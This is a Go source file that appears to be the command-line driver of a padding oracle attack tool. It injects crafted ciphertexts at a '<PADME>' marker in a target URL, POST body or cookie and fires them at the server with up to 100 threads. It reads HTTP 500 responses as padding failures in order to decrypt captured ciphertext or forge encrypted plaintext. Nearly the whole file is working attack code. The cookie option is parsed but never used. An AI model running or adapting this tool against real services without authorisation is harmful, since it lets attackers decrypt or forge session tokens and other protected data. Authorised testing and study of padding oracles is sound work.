package main

import (
	"flag"
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"net/url"

	"encoding/hex"
	"io/ioutil"
	"strings"

	"log"

	"github.com/swarley7/padoracle/libpadoracle"
)

type testpad struct {
	Data    string
	URL     string
	Method  string
	Cookies string
	Client  *http.Client
}

// EncodePayload turns the raw oracle payload (IV + Ciphertext) into whatever format is required by the endpoint server. Modify this routine to suit the specific needs of the application.
func (t testpad) EncodePayload(RawPadOraclePayload []byte) (encodedPayload string) {
	encodedPayload = hex.EncodeToString(RawPadOraclePayload)
	return encodedPayload
}

// DecodePayload is used to decode the initial CipherText payload provided as a CommandLine Argument
func (t testpad) DecodeCiphertextPayload(EncodedPayload string) []byte {
	var decoded []byte
	//****** EDIT this function to suit your particular ciphertext's encoding. ********//
	// This function should return a byte array of the ciphertext's raw bytes //
	decoded, err := hex.DecodeString(EncodedPayload)
	libpadoracle.Check(err)
	return decoded
}

// DecodeIV decodes the optionally-supplied Block0 initialisation vector. Modify the decode routine to suit the format of the supplied IV
func (t testpad) DecodeIV(IV string) []byte {
	return t.DecodeCiphertextPayload(IV)
}

// Modify this struct to suit whatever data you want to be available to the CheckResponse function.
// The sample includes the HTTP response code and HTTP response body (as a string). Again, this is a sample, modify to suit!
type Resp struct {
	ResponseCode int
	BodyData     string
}

// CallOracle actually makes the HTTP/whatever request to the server that provides the padding oracle and returns bool: true = padding was CORRECT/VALID; false = padding was INCORRECT/INVALID. Modify this to suit your application's needs.
func (t testpad) CallOracle(encodedPayload string) bool {
	if !strings.Contains(t.URL, "<PADME>") && !strings.Contains(t.Data, "<PADME>") && !strings.Contains(t.Cookies, "<PADME>") {
		panic("No marker supplied in URL or data")
	}

	req, err := http.NewRequest(t.Method, strings.Replace(t.URL, "<PADME>", encodedPayload, -1), strings.NewReader(strings.Replace(t.Data, "<PADME>", encodedPayload, -1)))
	libpadoracle.Check(err)

	// Set cookie
	req.Header.Set("Cookie", strings.Replace(t.Cookies, "<PADME>", encodedPayload, -1))
	resp, err := t.Client.Do(req)
	libpadoracle.Check(err)
	defer resp.Body.Close() // Return the response data back to the caller

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	libpadoracle.Check(err)
	return t.CheckResponse(Resp{ResponseCode: resp.StatusCode, BodyData: string(bodyBytes)})
}

// CheckResponse tells the program whether the padding was invalid or not. Modify to suit the application's response when invalid padding is detected.
func (t testpad) CheckResponse(resp Resp) bool {
	// Sample - the server's response includes the string "not padded correctly"
	// matched, _ := regexp.MatchString(`not padded correctly`, resp.BodyData)
	// fmt.Println(matched, err)
	if resp.ResponseCode == 500 {
		return false
	}
	return true
}

func main() {
	var cfg libpadoracle.Config
	var cipherText string
	var plainText string
	var iv string
	var Url string
	var method string
	var data string
	var proxyUrl string
	var cookies string

	flag.StringVar(&cipherText, "c", "", "Provide the base ciphertext that you're trying to decipher (ripped straight from your request)")
	flag.StringVar(&plainText, "p", "", "Provide the plaintext that you're trying to encrypt through exploitation of the padding oracle (for use with mode = 1)")
	flag.StringVar(&iv, "iv", "", "Optional: provide the IV for Block 0 of your ciphertext (if the application has done Crypto bad, and treated the IV as secret)")
	flag.StringVar(&cookies, "C", "", "Copy paste the cookies from your request in burp or whatever. E.g. \"cookie1=askldjf; cookie2=aaaaaaaaa; test=adfsdsfdf;\" Use the marker '<PADME>' to identify the injection point (note: will check GET and POST data)")
	flag.IntVar(&cfg.BlockSize, "bs", 16, "Block size for the ciphertext. Common values are 8 (DES), 16 (AES)")
	flag.IntVar(&cfg.Threads, "T", 100, "Number of threads to use for testing")
	flag.IntVar(&cfg.Sleep, "S", 0, "Sleep x miliseconds between requests to be nice to the server")
	flag.StringVar(&cfg.BlockRange, "blocks", "1,-1", "Optional: provide a range of blocks that are to be decrypted (useful for testing purposes). Note that the first value should always be '>=1'")
	flag.StringVar(&proxyUrl, "proxy", "", "Proxy to use for requests (if required)")

	flag.StringVar(&Url, "u", "", "The target URL. Use the marker '<PADME>' to identify the injection point (note: will check GET and POST data)")
	flag.StringVar(&method, "method", "GET", "HTTP method to use (default GET)")
	flag.StringVar(&data, "data", "", "Optional: POST data to supply with request")
	flag.IntVar(&cfg.Mode, "m", 0, "0 = Decrypt; 1 = Encrypt. Note: Encryption through a padding oracle cannot be concurrently performed (as far as I can determine). A single thread is used in this mode.")
	flag.BoolVar(&cfg.Debug, "d", false, "Debug mode")

	flag.Parse()
	if Url == "" {
		log.Fatal("No URL supplied.")
	}
	if cfg.Debug {
		go func() {
			fmt.Println("Profiler running on: localhost:6060")
			http.ListenAndServe("localhost:6060", nil)
		}()
	}
	client := &http.Client{}

	if proxyUrl != "" {
		pURL, err := url.Parse(proxyUrl)
		if err != nil {
			log.Fatal("Busted ProxyURL...", proxyUrl)
		}
		client.Transport = &http.Transport{Proxy: http.ProxyURL(pURL)}
	}
	cfg.Pad = testpad{URL: Url, Method: method, Data: data, Client: client}
	cfg.TargetPlaintext = []byte(plainText)
	cfg.BaseCiphertext = cfg.Pad.DecodeCiphertextPayload(cipherText)
	if iv != "" {
		cfg.IV = cfg.Pad.DecodeIV(iv)
	}
	libpadoracle.Run(cfg)

}
